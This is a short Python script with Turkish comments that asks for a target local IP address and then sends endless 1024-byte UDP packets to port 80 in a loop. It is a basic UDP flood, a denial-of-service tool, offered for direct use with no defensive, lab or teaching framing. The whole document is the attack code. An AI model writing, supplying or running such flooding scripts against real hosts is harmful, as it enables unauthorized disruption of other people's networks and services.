import socket

# Hedef IP adresini ve hedef portu burada ayarlayın
hedef_ip = input("Hedef Local İp: ")  # Hedefin IP adresi
hedef_port = 80  # Hedefin port numarası

# Gönderilecek veri boyutu (bayt cinsinden) - Bu kısmı ihtiyaca göre ayarlayın
veri_boyutu = 1024

# UDP soketi oluşturun
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

while True:
    veri = b'A' * veri_boyutu  # Gönderilecek veriyi oluşturun (örneğin 'A' karakteri verinin boyutunu belirler)
    udp_socket.sendto(veri, (hedef_ip, hedef_port))
    print(f'{veri_boyutu} byte veri gönderildi.')

# Eğer bu döngüyü durdurmak isterseniz, Ctrl + C kullanabilirsiniz.
